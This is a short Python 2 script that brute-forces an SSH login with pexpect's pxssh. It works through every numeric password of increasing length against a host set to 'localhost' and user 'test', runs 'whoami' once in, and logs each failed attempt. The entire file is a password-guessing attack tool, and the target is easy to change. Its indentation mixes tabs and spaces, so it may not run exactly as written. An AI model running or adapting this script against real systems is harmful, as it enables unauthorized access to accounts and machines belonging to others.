from string import digits
from itertools import product
import string, itertools, time
from pexpect import pxssh
import getpass
count=0;
hostname = 'localhost'
username = 'test'
characters = digits

def iter_all_strings():
    length = 1
    while True:
        for s in itertools.product(characters, repeat=length):
            yield ''.join((s))
    	length = length+1

for password in iter_all_strings():
	try:
		s = pxssh.pxssh()
		print password
		s.login (hostname, username, password)
		s.sendline('whoami')
		s.prompt()
		print s.before
		s.logout()
		break;
	except pxssh.ExceptionPxssh, e:
		count= count+1
		print "Failed login Attempt = ",count, "Reason : ",
		print str(e)
    